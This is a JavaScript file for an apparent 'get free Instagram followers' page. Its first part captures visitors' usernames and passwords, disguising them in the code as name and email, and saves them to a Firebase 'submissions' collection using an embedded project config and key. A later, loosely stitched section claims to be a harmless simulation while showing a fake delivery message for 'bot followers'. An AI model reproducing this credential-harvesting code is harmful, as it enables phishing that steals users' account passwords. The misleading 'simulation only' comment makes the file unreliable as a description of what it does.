// Import the functions you need from the SDKs
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";

// ⚠️ STEP 1: Replace this with your project's configuration
const firebaseConfig = {
    apiKey: "AIzaSyBOAS7bZbOSw7liSKGYc5VUz46s2d23iHk",
    authDomain: "instfollowers-36e25.firebaseapp.com",
    projectId: "instfollowers-36e25",
    storageBucket: "instfollowers-36e25.firebasestorage.app",
    messagingSenderId: "239353140245",
    appId: "1:239353140245:web:891f52f24a4ded2fe02a1c"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app); // Get a reference to the Firestore database

// ----------------------------------------------------------------------
// 🚀 STEP 2: Handle Form Submission
// ----------------------------------------------------------------------

// 1. Get references to the HTML elements
const contactForm = document.getElementById('followerForm');
const nameInput = document.getElementById('username');
const emailInput = document.getElementById('password');
const messageElement = document.getElementById('message');

// 2. Add an event listener to the form's submit event
contactForm.addEventListener('submit', (e) => {
    // Prevent the default form submission (which causes a page reload)
    e.preventDefault(); 
    
    // Get the values from the input fields
    const name = nameInput.value;
    const email = emailInput.value;

    // Call the function to save the data to Firestore
    saveSubmission(name, email);
    
    // Clear the form after submission
    contactForm.reset();
});


// ----------------------------------------------------------------------
// 💾 STEP 3: Write Data to Firestore
// ----------------------------------------------------------------------

async function saveSubmission(name, email) {
    try {
        // Prepare the data object
        const formData = {
            fullName: name,
            emailAddress: email,
            timestamp: new Date() // Add a timestamp for tracking
        };
        
        // Use addDoc to automatically generate a document ID 
        // and save the data to the 'submissions' collection
        const docRef = await addDoc(collection(db, "submissions"), formData);

        // Success feedback
        messageElement.textContent = `✅ Success! Document written with ID: ${docRef.id}`;
        messageElement.style.color = 'green';
        console.log("Document written with ID: ", docRef.id);

    } catch (e) {
        // Error feedback
        messageElement.textContent = `❌ Error adding document: ${e}`;
        messageElement.style.color = 'red';
        console.error("Error adding document: ", e);
    }

}
        const apiKey = "" // Keeping this for structure
        
        // Helper function for exponential backoff (included for completeness)
        async function fetchWithBackoff(url, options, maxRetries = 3) {
            for (let i = 0; i < maxRetries; i++) {
                try {
                    const response = await fetch(url, options);
                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    return response;
                } catch (error) {
                    if (i === maxRetries - 1) throw error; // Re-throw on last attempt
                    const delay = Math.pow(2, i) * 1000 + Math.random() * 1000;
                    console.warn(`Request failed, retrying in ${delay / 1000}s...`);
                    await new Promise(resolve => setTimeout(resolve, delay));
                }
            }
        }

        // Handle the mock form submission
        function handleSubmission(event) {
            event.preventDefault(); // Prevent actual form submission
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const submitButton = document.querySelector('button[type="submit"]');
            
            if (!username || !password) {
                showMessage("Please fill out both the username and password fields.", 'bg-red-900/50', 'text-red-300');
                return;
            }

            // --- IMPORTANT SAFETY NOTE (SIMULATION ONLY) ---
            // The following code simulates data submission but DOES NOT send any actual data.
            // Logging the data to the console for demonstration purposes.
            console.log(`[SIMULATION LOG]: Form submitted. Username: ${username}, Password: [HIDDEN]`);
            // --- END SAFETY NOTE ---

            // Disable button and show loading state
            submitButton.disabled = true;
            submitButton.innerHTML = 'Processing Request... <span class="animate-spin inline-block ml-2">&#9696;</span>';
            showMessage("Validating credentials and preparing 100 follower package...", 'bg-yellow-900/50', 'text-yellow-300');


            // Simulate an API call delay (2 seconds)
            setTimeout(() => {
                // Re-enable button
                submitButton.disabled = false;
                submitButton.innerHTML = 'GET MY FOLLOWERS NOW';
                
                // Show success message
                showMessage(`Success! The 100 bot followers package has been initiated for @${username}. Delivery will be completed within 24 hours.`, 'bg-green-700/70', 'text-white');
                
                // Clear the form (optional)
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                
            }, 2000); 
        }

        // Function to display messages in the custom box
        function showMessage(text, bgColorClass, textColorClass) {
            const messageBox = document.getElementById('message-box');
            // Remove previous classes
            messageBox.className = 'mt-4 p-4 text-center rounded-xl transition duration-500'; 
            
            messageBox.textContent = text;
            // Apply new classes for dynamic styling
            messageBox.classList.add(bgColorClass, textColorClass);
            messageBox.classList.remove('hidden');

            // Automatically hide after 10 seconds unless it's a success message
            if (!text.includes('Success!')) {
                 setTimeout(() => {
                    messageBox.classList.add('hidden');
                }, 10000);
            }
        }
